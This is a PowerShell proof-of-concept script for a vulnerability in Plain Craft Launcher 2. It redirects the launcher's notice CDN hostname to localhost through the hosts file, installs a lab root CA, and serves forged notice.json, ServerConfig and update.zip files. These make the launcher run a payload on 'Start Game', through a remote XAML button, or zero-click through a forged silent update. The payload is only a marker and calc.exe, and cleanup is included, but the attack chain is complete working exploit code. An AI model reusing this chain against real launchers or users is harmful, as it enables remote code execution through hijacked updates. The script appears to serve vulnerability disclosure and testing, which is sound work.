#Requires -Version 5.1
<#
.SYNOPSIS
    PCL2 (Plain Craft Launcher 2) notice.json local-hijack PoC.

.DESCRIPTION
    Installs a lab CA into the machine root store, points the PCL notice CDN
    hostname at 127.0.0.1, serves forged notice.cfg / notice.json /
    ServerConfig.json / update.zip from server.py, starts the supplied PCL
    build, and verifies that the payload (marker + calc.exe) was executed.

    Modes:
      launch : notice.json -> actions.setup -> LaunchAdvanceRun = payload.
               The payload fires when you click "Start Game" in PCL.
               (Reproduces the sample notice supplied by the requester.)
      update : notice.cfg v999 + notice.json -> actions.slientupdate +
               ServerConfig DownloadUrls -> update.zip = payload renamed to
               "Plain Craft Launcher 2.exe".  Zero-click: PCL downloads and
               extracts it, then executes it when PCL exits.
      xaml   : notice.json -> actions.setup -> remote Custom.xaml homepage
               + HintCustomCommand=true.  Two PCL starts: the first writes
               the settings, the second loads the XAML; one click on the
               injected button runs the payload.
      both   : launch + update (default).

    Run this only in an isolated Windows VM.  It modifies the hosts file,
    the machine root certificate store and the PCL settings; cleanup is
    attempted in the finally block.

.PARAMETER PclPath
    Path to the PCL executable.  Defaults to ..\Plain Craft Launcher 2.exe.

.PARAMETER Port
    Local HTTPS port (default 443, requires administrator).

.PARAMETER Timeout
    Seconds to wait for the payload marker (default 180).

.PARAMETER KeepArtifacts
    Do not delete the marker / payload / staging exe after the run.

.EXAMPLE
    powershell -ExecutionPolicy Bypass -File .\Invoke-PCLPoC.ps1 -Mode update
#>
[CmdletBinding()]
param(
    [ValidateSet('launch', 'update', 'xaml', 'both')]
    [string]$Mode = 'both',

    [string]$PclPath = '',

    [int]$Port = 443,

    [int]$Timeout = 180,

    [string]$PythonExe = '',

    [ValidateSet('auto', 'powershell', 'python')]
    [string]$Server = 'auto',

    [switch]$KeepArtifacts,

    [switch]$Pause,

    [switch]$Manual
)

$ErrorActionPreference = 'Stop'

$Domain       = 'pcl2-server-1253424809.file.myqcloud.com'
$PocDir       = Split-Path -Parent $MyInvocation.MyCommand.Path
$HostsFile    = Join-Path $env:SystemRoot 'System32\drivers\etc\hosts'
$PublicDir    = if ($env:PUBLIC) { $env:PUBLIC } else { 'C:\Users\Public' }
$PayloadExe   = Join-Path $PublicDir 'pclpoc.exe'
$MarkerFile   = Join-Path $env:TEMP 'pcl-poc-marker.txt'
$BackupDir    = Join-Path $PocDir 'backup'
$RunLog       = Join-Path $PocDir 'poc-run.log'
$pauseArg     = if ($Pause) { ' -Pause' } else { '' }
$usePsServer  = ($Server -ne 'python')
$manualArg    = if ($Manual) { ' -Manual' } else { '' }

function Write-Log {
    param([string]$Message)
    $line = '[{0:HH:mm:ss}] {1}' -f (Get-Date), $Message
    Write-Host $line
    Add-Content -LiteralPath $RunLog -Value $line -Encoding UTF8
}

function Test-Admin {
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    $pr = New-Object Security.Principal.WindowsPrincipal($id)
    return $pr.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Wait-Port {
    param([int]$TcpPort, [int]$Seconds = 15)
    $sw = [Diagnostics.Stopwatch]::StartNew()
    while ($sw.Elapsed.TotalSeconds -lt $Seconds) {
        try {
            $c = New-Object Net.Sockets.TcpClient
            $c.Connect('127.0.0.1', $TcpPort)
            $c.Close()
            return $true
        } catch {
            Start-Sleep -Milliseconds 250
        }
    }
    return $false
}

function Close-Pcl {
    param([System.Diagnostics.Process]$Process)
    if ($null -eq $Process -or $Process.HasExited) { return }
    Write-Log "Closing PCL PID $($Process.Id) ..."
    $null = $Process.CloseMainWindow()
    if (-not $Process.WaitForExit(10000)) {
        try {
            $ws = New-Object -ComObject WScript.Shell
            $null = $ws.AppActivate($Process.Id)
            Start-Sleep -Milliseconds 300
            $ws.SendKeys('%{F4}')
            Start-Sleep -Milliseconds 800
            $ws.SendKeys('{ENTER}')
        } catch { }
        $null = $Process.WaitForExit(8000)
    }
    if (-not $Process.HasExited) {
        Write-Log 'PCL did not exit gracefully, killing it (silent-update restart may be skipped).'
        Stop-Process -Id $Process.Id -Force
    }
}

# --------------------------------------------------------------------------
# PowerShell 7 compatibility: the payload compiler below needs Windows
# PowerShell 5.1 (`Add-Type -OutputType ConsoleApplication` is unsupported in
# pwsh 7).  Re-launch under 5.1 once, preserving elevation.
# --------------------------------------------------------------------------
if ($PSVersionTable.PSEdition -eq 'Core' -and $env:PCLPOC_PS51 -ne '1') {
    Write-Host '[*] PowerShell 7 detected; switching to Windows PowerShell 5.1 ...'
    $q = "`$env:PCLPOC_PS51='1'; & '$PSCommandPath' -Mode '$Mode' -PclPath '$PclPath' -Port $Port -Timeout $Timeout$pauseArg$manualArg"
    $ps51Args = @('-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', $q)
    try {
        if (Test-Admin) {
            Start-Process -FilePath 'powershell.exe' -ArgumentList $ps51Args | Out-Null
        } else {
            Start-Process -FilePath 'powershell.exe' -Verb RunAs -ArgumentList $ps51Args | Out-Null
        }
        exit
    } catch {
        Write-Warning "Could not start powershell.exe 5.1 ($($_.Exception.Message)); continuing in pwsh."
    }
}

# --------------------------------------------------------------------------
# elevation
# --------------------------------------------------------------------------
if (-not (Test-Admin)) {
    Write-Host '[*] Administrator privileges are required; relaunching elevated ...'
    $q = "& '$PSCommandPath' -Mode '$Mode' -PclPath '$PclPath' -Port $Port -Timeout $Timeout$pauseArg$manualArg"
    Start-Process -FilePath 'powershell.exe' -Verb RunAs -ArgumentList @(
        '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', $q
    ) | Out-Null
    exit
}

New-Item -ItemType Directory -Force -Path $BackupDir | Out-Null
Set-Content -LiteralPath $RunLog -Value "PCL2 notice.json PoC - $(Get-Date -Format o)" -Encoding UTF8

$srv         = $null
$pcl         = $null
$caCert      = $null
$leafCert    = $null
$hostsBackup = Join-Path $BackupDir 'hosts.bak'
$setupIni    = $null
$setupBackup = $null
$regBackup   = Join-Path $BackupDir 'pcl-reg.bak.reg'
$stagingExe  = $null
$stagingExisted = $false

try {
    # ----------------------------------------------------------------------
    # resolve paths / python
    # ----------------------------------------------------------------------
    if (-not $PclPath -and -not $Manual) {
        $PclPath = Join-Path (Split-Path -Parent $PocDir) 'Plain Craft Launcher 2.exe'
    }
    if ($PclPath) {
        if (-not (Test-Path -LiteralPath $PclPath)) {
            throw "PCL executable not found: $PclPath"
        }
        $PclPath = (Resolve-Path -LiteralPath $PclPath).Path
        $PclDir  = Split-Path -Parent $PclPath
        Write-Log "PCL: $PclPath"
    } else {
        Write-Log 'No PclPath: server-only manual mode; all PCL-specific steps are skipped.'
        Write-Log 'WARNING: PCL Setup.ini is not backed up; use a disposable PCL copy.'
        Write-Log 'WARNING: staging cleanup is skipped; delete <your PCL>\PCL\Plain Craft Launcher 2.exe manually.'
    }

    if (-not $usePsServer) {
    $pyPrefix = @()
    if ($PythonExe) {
        $pc = Get-Command $PythonExe -ErrorAction SilentlyContinue
        if ($pc) {
            $pyPath = $pc.Source
        } elseif (Test-Path -LiteralPath $PythonExe) {
            $pyPath = (Resolve-Path -LiteralPath $PythonExe).Path
        } else {
            throw "PythonExe not found: $PythonExe"
        }
        if ([IO.Path]::GetFileName($pyPath) -ieq 'py.exe') { $pyPrefix = @('-3') }
    } else {
        $pyPath = $null
        foreach ($name in @('python.exe', 'py.exe', 'python3.exe')) {
            foreach ($c in @(Get-Command $name -All -ErrorAction SilentlyContinue)) {
                if ($c.Source -like '*\WindowsApps\*') {
                    Write-Log "Skipping Microsoft Store alias: $($c.Source)"
                    continue
                }
                $pyPath = $c.Source
                if ($name -ieq 'py.exe') { $pyPrefix = @('-3') }
                break
            }
            if ($pyPath) { break }
        }
        if (-not $pyPath) {
            throw "No real Python 3 found. The python.exe in WindowsApps is a Microsoft Store alias and cannot run server.py. Install Python from python.org (check 'Add python.exe to PATH'), or run: winget install -e --id Python.Python.3.12  Then rerun with -PythonExe C:\Path\to\python.exe if needed."
        }
    }
    $ver = (& $pyPath @pyPrefix --version 2>&1) -join ' '
    if ($LASTEXITCODE -ne 0) {
        throw "Python failed to run: $pyPath $($pyPrefix -join ' ') --version => $ver"
    }
    Write-Log "Python: $pyPath ($ver)"
    }

    # ----------------------------------------------------------------------
    # backup / patch hosts
    # ----------------------------------------------------------------------
    Copy-Item -LiteralPath $HostsFile -Destination $hostsBackup -Force
    $hostsLines = Get-Content -LiteralPath $HostsFile -ErrorAction SilentlyContinue
    if (-not ($hostsLines -match "(^|\s)$([regex]::Escape($Domain))(\s|$)")) {
        Add-Content -LiteralPath $HostsFile -Value "`r`n127.0.0.1 $Domain" -Encoding ASCII
        Write-Log "hosts: $Domain -> 127.0.0.1"
    } else {
        Write-Log 'hosts already contains the lab entry.'
    }
    & ipconfig.exe /flushdns 2>$null | Out-Null
    Write-Log 'DNS cache flushed.' 

    # ----------------------------------------------------------------------
    # trust the lab CA
    # ----------------------------------------------------------------------
    if ($usePsServer) {
        Write-Log 'Generating lab CA and leaf certificates ...'
        $caCert = New-SelfSignedCertificate -Subject 'CN=PCL2 PoC Lab CA' `
            -CertStoreLocation 'Cert:\CurrentUser\My' -KeyUsage CertSign,CRLSign `
            -TextExtension @('2.5.29.19={critical}{text}ca=1') -NotAfter (Get-Date).AddYears(10)
        $leafCert = New-SelfSignedCertificate -DnsName $Domain -Signer $caCert `
            -CertStoreLocation 'Cert:\CurrentUser\My' `
            -TextExtension @('2.5.29.37={text}1.3.6.1.5.5.7.3.1') -NotAfter (Get-Date).AddYears(10)
        $caCer = Join-Path $BackupDir 'poc-ca.cer'
        Export-Certificate -Cert $caCert -FilePath $caCer -Force | Out-Null
        Import-Certificate -FilePath $caCer -CertStoreLocation 'Cert:\LocalMachine\Root' | Out-Null
        Write-Log "CA generated: $($caCert.Thumbprint)"
        Write-Log "leaf generated: $($leafCert.Thumbprint)"
    } else {
        $caPath = Join-Path $PocDir 'certs\ca.crt'
        $caCert = Import-Certificate -FilePath $caPath -CertStoreLocation 'Cert:\LocalMachine\Root'
        Write-Log "CA imported: $($caCert.Thumbprint)"
    }

    # ----------------------------------------------------------------------
    # build the payload (marker + calc.exe)
    # ----------------------------------------------------------------------
    $payloadCode = @'
using System;
using System.Diagnostics;
using System.IO;

public class PclPocPayload
{
    public static void Main(string[] args)
    {
        try
        {
            string marker = Path.Combine(Path.GetTempPath(), "pcl-poc-marker.txt");
            string line = DateTime.Now.ToString("o") + " pid=" +
                Process.GetCurrentProcess().Id + " args=" + string.Join(" ", args) +
                Environment.NewLine;
            File.AppendAllText(marker, line);
        }
        catch { }
        try { Process.Start("calc.exe"); } catch { }
    }
}
'@
    if (Test-Path -LiteralPath $PayloadExe) { Remove-Item -LiteralPath $PayloadExe -Force }
    try {
        Add-Type -TypeDefinition $payloadCode -OutputAssembly $PayloadExe -OutputType ConsoleApplication -ErrorAction Stop
        Write-Log "payload compiled: $PayloadExe"
    } catch {
        Write-Log "payload compile failed ($($_.Exception.Message)); falling back to calc.exe copy"
        Copy-Item -LiteralPath (Join-Path $env:SystemRoot 'System32\calc.exe') -Destination $PayloadExe -Force
    }

    # ----------------------------------------------------------------------
    # back up PCL state that the notice will modify
    # ----------------------------------------------------------------------
    if ($PclDir) {
        $setupIni = Join-Path $PclDir 'PCL\Setup.ini'
        if (Test-Path -LiteralPath $setupIni) {
            $setupBackup = Join-Path $BackupDir 'Setup.ini.bak'
            Copy-Item -LiteralPath $setupIni -Destination $setupBackup -Force
        }
    }
    & cmd.exe /c "reg export `"HKCU\Software\PCL`" `"$regBackup`" /y >nul 2>&1"

    # reset notice bookkeeping so our id is always considered new
    & cmd.exe /c "reg add `"HKCU\Software\PCL`" /v HintNotice /t REG_SZ /d 0 /f >nul 2>&1"

    # remove stale caches
    $cacheDir = Join-Path $env:TEMP 'PCL\Cache'
    foreach ($n in @('Notice.json', 'Notice.cfg', 'ServerConfig.json', 'Custom.xaml')) {
        Remove-Item -LiteralPath (Join-Path $cacheDir $n) -Force -ErrorAction SilentlyContinue
    }
    Remove-Item -LiteralPath $MarkerFile -Force -ErrorAction SilentlyContinue

    if ($PclDir) {
        $stagingExe = Join-Path $PclDir 'PCL\Plain Craft Launcher 2.exe'
        if (Test-Path -LiteralPath $stagingExe) {
            $stagingExisted = $true
            Copy-Item -LiteralPath $stagingExe -Destination (Join-Path $BackupDir 'staging.bak') -Force
            Remove-Item -LiteralPath $stagingExe -Force -ErrorAction SilentlyContinue
        }
    }

    # ----------------------------------------------------------------------
    # start the forged HTTPS server
    # ----------------------------------------------------------------------
    $zip = Join-Path $PocDir 'www\update.zip'
    Remove-Item -LiteralPath $zip -Force -ErrorAction SilentlyContinue

    $stdout = Join-Path $BackupDir 'server.out.log'
    $stderr = Join-Path $BackupDir 'server.err.log'
    if ($usePsServer) {
        $serverScript = Join-Path $PocDir 'server.ps1'
        $serverArgs = @(
            '-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', ('"' + $serverScript + '"'),
            '-Mode', $Mode,
            '-Bind', '127.0.0.1',
            '-Port', $Port,
            '-PayloadExe', ('"' + $PayloadExe + '"'),
            '-CertThumbprint', $leafCert.Thumbprint
        )
        $srv = Start-Process -FilePath 'powershell.exe' -ArgumentList $serverArgs `
            -PassThru -WindowStyle Hidden -RedirectStandardOutput $stdout -RedirectStandardError $stderr
    } else {
        $serverScript = Join-Path $PocDir 'server.py'
        $serverArgs = @(
            ('"' + $serverScript + '"'),
            '--mode', $Mode,
            '--bind', '127.0.0.1',
            '--port', $Port,
            '--payload-exe', ('"' + $PayloadExe + '"')
        )
        $srv = Start-Process -FilePath $pyPath -ArgumentList (@($pyPrefix) + $serverArgs) `
            -PassThru -WindowStyle Hidden -RedirectStandardOutput $stdout -RedirectStandardError $stderr
    }
    if (-not (Wait-Port -TcpPort $Port -Seconds 15)) {
        $tail = ''
        if (Test-Path -LiteralPath $stderr) {
            $tail = ((Get-Content -LiteralPath $stderr -Tail 30 -ErrorAction SilentlyContinue) -join [Environment]::NewLine)
        }
        throw "PoC server did not listen on port $Port. Server stderr:`n$tail`nSee $stderr"
    }
    Write-Log "PoC server listening on https://127.0.0.1:$Port (mode=$Mode)"

    # ----------------------------------------------------------------------
    # start PCL
    # ----------------------------------------------------------------------
    if ($Manual) {
        Write-Log 'Manual mode: PCL will not be started or closed by this script.'
        Write-Host ''
        Write-Host '>>> MANUAL MODE: start and close PCL yourself.' -ForegroundColor Yellow
        if ($PclPath) {
            Write-Host ">>> PCL: $PclPath"
        } else {
            Write-Host '>>> PCL: your own copy (this script does not track or touch it)'
        }
        $stagingLabel = if ($stagingExe) { $stagingExe } else { '<your PCL folder>\PCL\Plain Craft Launcher 2.exe' }
        switch ($Mode) {
            'update' { Write-Host ">>> Wait until this file exists: $stagingLabel" }
            'both'   { Write-Host ">>> Wait until this file exists: $stagingLabel" }
            'launch' { Write-Host '>>> In PCL, click "Start Game".' }
            'xaml'   { Write-Host '>>> Start PCL, wait about 20 seconds, close it, start it again, then click "Continue".' }
        }
        Write-Host '>>> Then close PCL normally (for update mode) or finish the click.'
        Write-Host '>>> The server keeps running while you work.'
        Write-Host '>>> When done, press Enter in THIS window to verify and cleanup.'
        Write-Host ''
        Read-Host 'Press Enter to stop the server and cleanup'
    } else {
        Write-Log 'Starting PCL ...'
        $pcl = Start-Process -FilePath $PclPath -WorkingDirectory $PclDir -PassThru
        Write-Log "PCL PID $($pcl.Id)"

        if ($Mode -eq 'update' -or $Mode -eq 'both') {
            Write-Log 'Waiting for the silent update to stage PCL\Plain Craft Launcher 2.exe ...'
            $sw = [Diagnostics.Stopwatch]::StartNew()
            while ($sw.Elapsed.TotalSeconds -lt 120) {
                if ((Test-Path -LiteralPath $stagingExe) -and ((Get-Item -LiteralPath $stagingExe).Length -gt 0)) {
                    Write-Log 'update payload staged.'
                    break
                }
                Start-Sleep -Milliseconds 500
            }
            if (-not (Test-Path -LiteralPath $stagingExe)) {
                Write-Log 'WARNING: update payload was not staged; check server logs and PCL logs.'
            }
            Start-Sleep -Seconds 2
            Close-Pcl -Process $pcl
        }

        if ($Mode -eq 'xaml') {
            Write-Log 'First start: writing malicious settings, then restarting PCL.'
            Start-Sleep -Seconds 20
            Close-Pcl -Process $pcl
            Start-Sleep -Seconds 2
            $pcl = Start-Process -FilePath $PclPath -WorkingDirectory $PclDir -PassThru
            Write-Log "PCL PID $($pcl.Id) (second start)"
            Write-Log 'Waiting for Custom.xaml to be downloaded ...'
            $xamlCache = Join-Path $cacheDir 'Custom.xaml'
            $sw = [Diagnostics.Stopwatch]::StartNew()
            while ($sw.Elapsed.TotalSeconds -lt 60) {
                if (Test-Path -LiteralPath $xamlCache) { break }
                Start-Sleep -Milliseconds 500
            }
            Write-Host ''
            Write-Host '>>> Fake Custom.xaml loaded. Click "Continue" on the PCL home page.' -ForegroundColor Yellow
            Write-Host ''
        } elseif ($Mode -eq 'launch') {
            Write-Host ''
            Write-Host '>>> In PCL, click "Start Game" (a working Minecraft instance is required).' -ForegroundColor Yellow
            Write-Host '>>> This is what runs the LaunchAdvanceRun payload.' -ForegroundColor Yellow
            Write-Host ''
        }

    }

    # ----------------------------------------------------------------------
    # wait for the marker
    # ----------------------------------------------------------------------
    if (-not $Manual) {
        Write-Log "Waiting up to $Timeout seconds for $MarkerFile ..."
        $sw = [Diagnostics.Stopwatch]::StartNew()
        while ($sw.Elapsed.TotalSeconds -lt $Timeout) {
            if (Test-Path -LiteralPath $MarkerFile) { break }
            if ($pcl -and $pcl.HasExited -and $Mode -ne 'update' -and $Mode -ne 'both') { break }
            Start-Sleep -Milliseconds 500
        }
    }

    if (Test-Path -LiteralPath $MarkerFile) {
        Write-Host ''
        Write-Host '[+] SUCCESS: payload executed.' -ForegroundColor Green
        Get-Content -LiteralPath $MarkerFile | ForEach-Object { Write-Host "    $_" }
        Write-Host ''
    } else {
        Write-Host ''
        Write-Host '[-] No marker file was produced.' -ForegroundColor Red
        if ($PclDir) {
            Write-Host "    PCL log: $PclDir\PCL\Log*.txt"
        }
        Write-Host "    server log: $stdout"
        Write-Host ''
    }

    if ($pcl -and -not $pcl.HasExited) {
        Write-Log 'Leaving PCL running for inspection.'
    }
}
catch {
    Write-Host ''
    Write-Host "[-] ERROR: $($_.Exception.Message)" -ForegroundColor Red
    try { Write-Log "ERROR: $($_.Exception.Message)" } catch { }
}
finally {
    Write-Log 'Cleanup ...'
    if ($srv -and -not $srv.HasExited) {
        Stop-Process -Id $srv.Id -Force -ErrorAction SilentlyContinue
    }
    if ($pcl -and -not $pcl.HasExited) {
        try { $pcl.CloseMainWindow() | Out-Null } catch { }
        Start-Sleep -Milliseconds 500
        if (-not $pcl.HasExited) { Stop-Process -Id $pcl.Id -Force -ErrorAction SilentlyContinue }
    }

    if ($caCert) {
        Remove-Item -LiteralPath "Cert:\LocalMachine\Root\$($caCert.Thumbprint)" -Force -ErrorAction SilentlyContinue
        if ($usePsServer) {
            Remove-Item -LiteralPath "Cert:\CurrentUser\My\$($caCert.Thumbprint)" -Force -ErrorAction SilentlyContinue
        }
        Write-Log 'CA removed.'
    }
    if ($leafCert) {
        Remove-Item -LiteralPath "Cert:\CurrentUser\My\$($leafCert.Thumbprint)" -Force -ErrorAction SilentlyContinue
        Write-Log 'leaf certificate removed.'
    }
    if (Test-Path -LiteralPath $hostsBackup) {
        Copy-Item -LiteralPath $hostsBackup -Destination $HostsFile -Force
        Write-Log 'hosts restored.'
    }
    if ($setupBackup -and (Test-Path -LiteralPath $setupBackup)) {
        Copy-Item -LiteralPath $setupBackup -Destination $setupIni -Force
    }
    if (Test-Path -LiteralPath $regBackup) {
        & cmd.exe /c "reg import `"$regBackup`" >nul 2>&1"
        Write-Log 'PCL registry restored.'
    }
    if ($stagingExisted -and (Test-Path -LiteralPath (Join-Path $BackupDir 'staging.bak'))) {
        Copy-Item -LiteralPath (Join-Path $BackupDir 'staging.bak') -Destination $stagingExe -Force -ErrorAction SilentlyContinue
    } elseif (-not $stagingExisted -and $stagingExe -and (Test-Path -LiteralPath $stagingExe)) {
        Remove-Item -LiteralPath $stagingExe -Force -ErrorAction SilentlyContinue
    }
    if (-not $setupBackup -and $setupIni -and (Test-Path -LiteralPath $setupIni)) {
        Remove-Item -LiteralPath $setupIni -Force -ErrorAction SilentlyContinue
    }
    if ($cacheDir) {
        foreach ($n in @('Notice.json', 'notice.cfg', 'ServerConfig.json', 'Custom.xaml')) {
            Remove-Item -LiteralPath (Join-Path $cacheDir $n) -Force -ErrorAction SilentlyContinue
        }
    }
    if (-not $KeepArtifacts) {
        Remove-Item -LiteralPath $PayloadExe -Force -ErrorAction SilentlyContinue
    }
    Write-Log 'Done.'
}

if ($Pause) {
    Write-Host ''
    Read-Host 'Press Enter to close'
}
